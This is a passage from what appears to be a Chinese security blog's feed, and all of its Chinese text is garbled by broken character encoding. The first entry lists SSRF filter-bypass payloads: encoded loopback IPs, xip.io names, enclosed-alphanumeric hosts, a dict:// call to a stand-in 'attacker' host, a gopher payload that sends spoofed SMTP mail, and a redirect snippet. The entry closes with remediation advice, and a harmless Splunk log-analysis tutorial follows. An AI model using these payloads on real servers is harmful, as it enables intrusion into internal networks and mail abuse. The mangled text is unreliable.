class="line">ï¼ˆ2ï¼‰TinyURLï¼šhttps://tinyurl.com/create.php#æ”¯æŒip</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">1.4.5åˆ©ç”¨ç‰¹æ®ŠåŸŸå</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨çš„åŸç†æ˜¯DNSè§£æ</span><br><span class="line">http://127.0.0.1.xip.io/</span><br><span class="line">http://www.owasp.org.127.0.0.1.xip.io/</span><br><span class="line">http://mysite.127.0.0.1.xip.io</span><br><span class="line">http://foo.bar.127.0.0.1.xip.io</span><br><span class="line">#åˆ©ç”¨</span><br><span class="line">ssrf.php?url=http://127.0.0.1.xip.io/</span><br><span class="line">or</span><br><span class="line">ssrf.php?url=http://www.127.0.0.1.xip.io/</span><br><span class="line">or</span><br><span class="line">ssrf.php?url=http://evi1.cn.127.0.0.1.xip.io/</span><br><span class="line">or</span><br><span class="line">ssrf.php?url=dict://evi1.cn.127.0.0.1.xip.io:22/info</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">1.4.6 åˆ©ç”¨DNSè§£æ</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åŸŸåä¸Šè®¾ç½®Aè®°å½•ï¼ŒæŒ‡å‘127.0.1</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">1.4.7 åˆ©ç”¨ä¸Šä¼ </font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¹Ÿä¸ä¸€å®šæ˜¯ä¸Šä¼ ï¼Œæˆ‘ä¹Ÿè¯´ä¸æ¸…ï¼Œè‡ªå·±ä½“ä¼š -.-</span><br><span class="line">ä¿®æ”¹&quot;type=file&quot;ä¸º&quot;type=url&quot;</span><br><span class="line">æ¯”å¦‚ï¼š</span><br><span class="line">ä¸Šä¼ å›¾ç‰‡å¤„ä¿®æ”¹ä¸Šä¼ ï¼Œå°†å›¾ç‰‡æ–‡ä»¶ä¿®æ”¹ä¸ºURLï¼Œå³å¯èƒ½è§¦å‘SSRF</span><br></pre></td></tr></table></figure><ul><li><p><a href="https://hackerone.com/reports/713" target="_blank" rel="noopener">ä¾‹å­</a></p></li><li><p><font face="å¾®è½¯é›…é»‘">1.4.8 åˆ©ç”¨Enclosed alphanumerics</font></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨Enclosed alphanumerics</span><br><span class="line">http://â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ  &gt;&gt;&gt;  http://example.com</span><br><span class="line">List:</span><br><span class="line">â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ </span><br><span class="line">â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ </span><br><span class="line">â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› </span><br><span class="line">â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ </span><br><span class="line">â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ </span><br><span class="line">â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© </span><br><span class="line">â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ </span><br><span class="line">â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">1.4.9 åˆ©ç”¨å¥å·</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127ã€‚0ã€‚0ã€‚1  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">1.4.10 åˆ©ç”¨è¿›åˆ¶è½¬æ¢<br>  â€“ IPè¿›åˆ¶è½¬æ¢åœ°å€ï¼š<a href="../../../../scale.html">è½¬æ¢åœ°å€</a></font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">å¯ä»¥æ˜¯åå…­è¿›åˆ¶ï¼Œå…«è¿›åˆ¶ç­‰ã€‚</span><br><span class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class="line">é¦–å…ˆæŠŠè¿™å››æ®µæ•°å­—ç»™åˆ†åˆ«è½¬æˆ16è¿›åˆ¶ï¼Œç»“æœï¼š73 ef d2 1a</span><br><span class="line">ç„¶åæŠŠ 73efd21a è¿™åå…­è¿›åˆ¶ä¸€èµ·è½¬æ¢æˆ8è¿›åˆ¶</span><br><span class="line">è®°å¾—è®¿é—®çš„æ—¶å€™åŠ 0è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶(å¯ä»¥æ˜¯ä¸€ä¸ª0ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª0 è·ŸXSSä¸­å¤šåŠ å‡ ä¸ª0æ¥ç»•è¿‡è¿‡æ»¤ä¸€æ ·)ï¼Œåå…­è¿›åˆ¶åŠ 0x</span><br><span class="line"></span><br><span class="line">IPè½¬æ¢ä¸º-16è¿›åˆ¶-è®°å¾—è®¿é—®çš„æ—¶å€™åŠ 0Xè¡¨ç¤ºä½¿ç”¨16è¿›åˆ¶</span><br><span class="line">http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://0X7F000001</span><br><span class="line"></span><br><span class="line">IPè½¬æ¢ä¸º-16è¿›åˆ¶-è½¬æ¢ä¸ºå…«è¿›åˆ¶-è®°å¾—è®¿é—®çš„æ—¶å€™åŠ 0è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶</span><br><span class="line">http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://17700000001&gt;&gt;&gt;http://017700000001</span><br><span class="line"></span><br><span class="line">127è½¬æ¢ä¸º8è¿›åˆ¶ï¼š</span><br><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://0177.0.0.1/</span><br><span class="line"></span><br><span class="line">ipåœ°å€è½¬æ¢ä¸º10è¿›åˆ¶ï¼š</span><br><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/</span><br><span class="line">http://192.168.0.1  &gt;&gt;&gt;  http://3232235521/</span><br><span class="line">http://192.168.1.1  &gt;&gt;&gt;  http://3232235777/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#ip:127.0.0.1</span><br><span class="line"></span><br><span class="line">ï¼ˆ1ï¼‰8è¿›åˆ¶æ ¼å¼ï¼š0177.0.0.1</span><br><span class="line">ï¼ˆ2ï¼‰16è¿›åˆ¶æ ¼å¼ï¼š0x7F.00.00.01</span><br><span class="line">ï¼ˆ3ï¼‰8è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š017700000001</span><br><span class="line">ï¼ˆ3ï¼‰10è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š2130706433</span><br><span class="line">ï¼ˆ4ï¼‰16è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š0x7f000001</span><br><span class="line"></span><br><span class="line">#è½¬æ¢æ–¹æ³•</span><br><span class="line"></span><br><span class="line">8è¿›åˆ¶å‰åŠ 0ï¼Œ16è¿›åˆ¶å‰åŠ 0x</span><br><span class="line">å°†ipçš„æ¯ä¸€ä½ç”±åè¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œå†å°†äºŒè¿›åˆ¶è½¬æ¢ä¸ºå…«è¿›åˆ¶æˆ–åå…­è¿›åˆ¶</span><br><span class="line">å…³äºæ•´æ•°æ ¼å¼ï¼šipv4æ˜¯32ä½äºŒè¿›åˆ¶æ•°ï¼Œå°†å…¶è½¬æ¢ä¸º32ä½äºŒè¿›åˆ¶æ•°ï¼Œå†å°†å…¶è½¬æ¢ä¸ºåè¿›åˆ¶æˆ–åå…­è¿›åˆ¶</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">1.4.11 åˆ©ç”¨ç‰¹æ®Šåœ°å€</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0/</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">1.4.12 åˆ©ç”¨åè®®</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dict://</span><br><span class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line">ssrf.php?url=dict://attacker:11111/</span><br><span class="line">SFTP://</span><br><span class="line">ssrf.php?url=sftp://example.com:11111/</span><br><span class="line">TFTP://</span><br><span class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class="line">LDAP://</span><br><span class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class="line">Gopher://</span><br><span class="line">ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">1.4.13 åˆ©ç”¨301æˆ–è€…302è·³è½¬</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.th1s.cn/test/ssrf.php</span><br><span class="line">ssrf.phpé‡Œé¢çš„å†…å®¹ä¸ºï¼š</span><br><span class="line">&lt;?php header(&apos;Location:10.1.1.1&apos;);?&gt;</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">1.4.14 ä½¿ç”¨ç»„åˆ</font></li></ul><p>å„ç§ç»•è¿‡è¿›è¡Œè‡ªç”±ç»„åˆå³å¯</p><p>å‚è€ƒé“¾æ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF</span><br><span class="line">https://twitter.com/albinowax/status/890725759861403648</span><br><span class="line">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</span><br><span class="line">https://hackerone.com/reports/115748</span><br><span class="line">https://www.dailysecurity.fr/server-side-request-forgery/</span><br><span class="line">https://twitter.com/EdOverflow</span><br><span class="line">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection</span><br><span class="line">http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf</span><br><span class="line">http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</span><br><span class="line">http://blog.csdn.net/xinianbuxiu/article/details/53560417</span><br></pre></td></tr></table></figure><h2><span id="17-ssrfå±å®³">1.7 SSRFå±å®³</span></h2><ul><li>ä¸»æœºæœ¬åœ°æ•æ„Ÿä¿¡æ¯è¯»å–ï¼Œ å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„Bannerä¿¡æ¯ã€‚</li><li>æ”»å‡»è¿è¡Œåœ¨å†…å¤–ç½‘ä¸»æœºçš„åº”ç”¨ç¨‹åºã€‚</li><li>é€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å¯¹å†…ç½‘ Web åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ã€‚</li><li>æ”»å‡»å†…å¤–ç½‘çš„ Web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ GETå‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»ã€‚</li><li>åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚</li></ul><h2><span id="18-æ¼æ´ä¿®å¤">1.8 æ¼æ´ä¿®å¤</span></h2><ul><li><p>ç¦æ­¢302è·³è½¬</p></li><li><p>è¿‡æ»¤è¿”å›ä¿¡æ¯ï¼ŒéªŒè¯è¿œç¨‹æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å“åº”æ˜¯æ¯”è¾ƒå®¹æ˜“çš„æ–¹æ³•ã€‚å¦‚æœwebåº”ç”¨æ˜¯å»è·å–æŸä¸€ç§ç±»å‹çš„æ–‡ä»¶ã€‚é‚£ä¹ˆåœ¨æŠŠè¿”å›ç»“æœå±•ç¤ºç»™ç”¨æˆ·ä¹‹å‰å…ˆéªŒè¯è¿”å›çš„ä¿¡æ¯æ˜¯å¦ç¬¦åˆæ ‡å‡†ã€‚</p></li><li><p>ç¦ç”¨ä¸éœ€è¦çš„åè®®ï¼Œä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ç±»ä¼¼äºfile://, gopher://, ftp:// ç­‰å¼•èµ·çš„é—®é¢˜</p></li><li><p>è®¾ç½®URLç™½åå•æˆ–è€…é™åˆ¶å†…ç½‘IPï¼ˆä½¿ç”¨gethostbyname()åˆ¤æ–­æ˜¯å¦ä¸ºå†…ç½‘IPï¼‰</p></li><li><p>é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºhttpå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ 80ã€443ã€8080ã€8090</p></li><li><p>ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€ã€‚</p></li></ul><h2><span id="19-å‚è€ƒæ–‡ç« ">1.9 å‚è€ƒæ–‡ç« </span></h2><ul><li><a href="https://www.evi1.cn/post/ssrf/" target="_blank" rel="noopener">SSRFå­¦ä¹ ç¬”è®°</a></li><li><a href="https://www.evi1.cn/post/ssrf/" target="_blank" rel="noopener">ssrfæ”»å‡»å†…ç½‘åº”ç”¨</a></li><li><a href="https://v0w.top/2018/11/23/SSRF-notes/#Some-Tricks-in-SSRF" target="_blank" rel="noopener">SSRF å­¦ä¹ ç¬”è®°</a></li><li><a href="https://www.jianshu.com/p/949a2cb3be36?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">gopher åè®®æ”»å‡»å†…ç½‘ mysql</a></li><li><a href="https://www.smi1e.top/gopher-ssrfæ”»å‡»å†…ç½‘åº”ç”¨å¤ç°/" target="_blank" rel="noopener">gopher SSRFæ”»å‡»å†…ç½‘åº”ç”¨å¤ç°</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-ssrf&quot;&gt;1ã€SSRF&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-æè¿°&quot;&gt;1.1ã€æè¿°ï¼š&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#12-æ¼æ´å¯»æ‰¾&quot;&gt;1.2ã€æ¼æ´å¯»æ‰¾ï¼š&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
      
    
    </summary>
    
    
      <category term="WEBå®‰å…¨" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEBæ¸—é€æµ‹è¯•" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>æ—¥å¿—åˆ†æç¥å™¨_Splunk</title>
    <link href="http://www.vkxss.top/2019/06/12/%E5%BA%94%E6%80%A5-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%A5%9E%E5%99%A8_Splunk/"/>
    <id>http://www.vkxss.top/2019/06/12/åº”æ€¥-æ—¥å¿—åˆ†æç¥å™¨_Splunk/</id>
    <published>2019-06-12T07:30:08.000Z</published>
    <updated>2019-09-20T02:00:53.772Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x01å®‰è£…">0x01å®‰è£…</a></li><li><a href="#0x02æ—¥å¿—åˆ†æ">0x02æ—¥å¿—åˆ†æ</a></li><li><a href="#0x03åˆ†ææ¡ˆä¾‹">0x03åˆ†ææ¡ˆä¾‹</a><ul><li><a href="#0x031-splunk-åè¯è¯´æ˜">0x03.1 Splunk åè¯è¯´æ˜</a></li><li><a href="#0x032-æ¡ˆä¾‹">0x03.2 æ¡ˆä¾‹</a><ul><li><a href="#æ¡ˆä¾‹ä¸€ç»Ÿè®¡-top">æ¡ˆä¾‹ä¸€ï¼šç»Ÿè®¡-top</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="0x01å®‰è£…">0x01å®‰è£…</span></h1><ul><li><p><font face="å¾®è½¯é›…é»‘">æ­å»ºç³»ç»Ÿç¯å¢ƒ</font></p><ul><li>16.04.1-Ubuntu-64</li></ul></li><li><p><font face="å¾®è½¯é›…é»‘">Splunk</font></p><ul><li>splunk-7.3.0-657388c7a488-Linux-x86_64</li></ul></li></ul><ul><li><p><font face="å¾®è½¯é›…é»‘">ä¸‹è½½è§£å‹ï¼ˆæƒ³è¦å®‰è£…åŒ…è¯·ç•™è¨€ï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H490ca17d147b4c189df7df43e9ee21ed0.jpg" style="zoom:50%"></center></font></font></p></li><li><p><font face="å¾®è½¯é›…é»‘">è§£å‹å®Œåï¼Œcdåˆ°splunk/binç›®å½•ä¸‹å¯åŠ¨ï¼Œç„¶åéœ€è¦è¾“å…¥webç™»å½•çš„è´¦æˆ·å’Œå¯†ç ï¼ŒæˆåŠŸå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</font></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿è¡Œå‘½ä»¤:sudo ./splunk start</span><br></pre></td></tr></table></figure><p>  <font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H617d2cb20d63432288042458c2dc1c58O.jpg" style="zoom:50%"></center></font></p></li><li><p><font face="å¾®è½¯é›…é»‘"> æŸ¥çœ‹è™šæ‹ŸæœºIPï¼Œåœ¨æœ¬åœ°æµè§ˆå™¨è®¿é—®ï¼Œè¾“å…¥è‡ªå·±è®¾ç½®çš„è´¦æˆ·å’Œå¯†ç å³å¯ï¼š<br>  <font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H3eccc3d7cb534c1fbc6cacdfda9db044G.jpg" style="zoom:50%"></center></font></font></p></li></ul><h1><span id="0x02æ—¥å¿—åˆ†æ">0x02æ—¥å¿—åˆ†æ</span></h1><ul><li><p><font face="å¾®è½¯é›…é»‘">è½½å…¥éœ€è¦åˆ†æçš„æ—¥å¿—ï¼Œä¸€ç›´ä¸‹ä¸€æ­¥å³å¯ï¼Œæ³¨æ„ä¿®æ”¹ä¸‹ä¸»æœºå­—æ®µå€¼ï¼Œæ–¹ä¾¿æŸ¥æ‰¾ï¼Œæœ€åç‚¹å‡»æäº¤å³å¯ï¼š</font></p><p>  <font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H20490399ef8d4a788eee64df7a2e3024C.jpg" style="zoom:50%"></center><br>  <font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/Hd0e793841a064d4cbee514d3293daf8cP.jpg" style="zoom:50%"></center><br>  <font face="å¾®è½¯é›…é»‘"><center><img src style="zoom:50%"></center><br>  <font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H083b8247b5be4b7cbdbf3c69352b46b6Q.jpg" style="zoom:50%"></center><br>  <font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H083b8247b5be4b7cbdbf3c69352b46b6Q.jpg" style="zoom:50%"></center><br>  <font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H28f37b403b0749e7983ae850a7f37d6c1.jpg" style="zoom:50%"></center><br>  <font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H5c11e6ef5b7044c5831584f5e34eb188M.jpg" style="zoom:50%"></center><br>  <font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H924370913bce4d7aa79fe75e993a4af1a.jpg" style="zoom:50%"></center></font></font></font></font></font></font></font></font></p></li></ul><h1><span id="0x03åˆ†ææ¡ˆä¾‹">0x03åˆ†ææ¡ˆä¾‹</span></h1><h2><span id="0x031-splunk-åè¯è¯´æ˜">0x03.1 Splunk åè¯è¯´æ˜</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Data Input :  æ·»åŠ æ•°æ® ï¼ˆæ–‡ä»¶æˆ–æ–‡ä»¶ç›®å½•ã€TCPã€UDPã€WMIã€Script, Forwarderâ€¦ï¼‰</span><br><span class="line">Source type ï¼š æ¥æºç±»å‹ ï¼ˆapache logs, security logã€network logâ€¦ï¼‰</span><br><span class="line">Host ï¼šä¸»æœº ï¼ˆapache1ã€apche2, apcahe3â€¦)  </span><br><span class="line">Sourceï¼šæ•°æ®æº ï¼ˆ/opt/apache/log/*.*ï¼‰</span><br><span class="line">Indexï¼šç´¢å¼•ï¼ˆSplunk ç´¢å¼•ï¼‰</span><br><span class="line">Fieldï¼šå­—æ®µï¼š æ­£åˆ™è¡¨è¾¾å¼ (Regular Expression) å–å‡ºç¬¦åˆæŸä¸ªæ¡ä»¶å­—æ®µ</span><br><span class="line">Search Languageï¼šæœç´¢è¯­å¥ ï¼ˆç¼©å°èŒƒå›´ -&gt;  è®¡ç®— -&gt; å‘ˆç° ï¼‰</span><br><span class="line">Saved Searchï¼š æœç´¢è¯­å¥å‚¨å­˜ï¼Œæœªæ¥å¯ä»¥ç›´æ¥ä½¿ç”¨</span><br><span class="line">Report ï¼š å ±è¡¨ï¼Œæœç´¢ç»“æœ -&gt; å›¾å½¢æŠ¥è¡¨</span><br><span class="line">Alertï¼šå‘Šè­¦ï¼Œæœç´¢ç»“æœé€šæŠ¥</span><br></pre></td></tr></table></figure><h2><span id="0x032-æ¡ˆä¾‹">0x03.2 æ¡ˆä¾‹</span></h2><h3><span id="æ¡ˆä¾‹ä¸€ç»Ÿè®¡-top">æ¡ˆä¾‹ä¸€ï¼šç»Ÿè®¡-top</span></h3><ul><li><font face="å¾®è½¯é›…é»‘">åˆ†æçŠ¶æ€ç ä¸º200ã€æ”»å‡»è€…å‰10çš„IPåœ°å€ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H720770574f114404b4af89ebf88740f5H.jpg" style="zoom:50%"></center></font></font></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x01å®‰è£…&quot;&gt;0x01å®‰è£…&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02æ—¥å¿—åˆ†æ&quot;&gt;0x02æ—¥å¿—åˆ†æ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x03åˆ†ææ¡ˆä¾‹&quot;&gt;0x03åˆ†ææ¡ˆä¾‹&lt;/a&gt;&lt;ul&gt;

      
    
    </summary>
    
    
      <category term="åº”æ€¥å“åº”" scheme="http://www.vkxss.top/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
      <category term="åº”æ€¥å“åº”" scheme="http://www.vkxss.top/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
</feed>
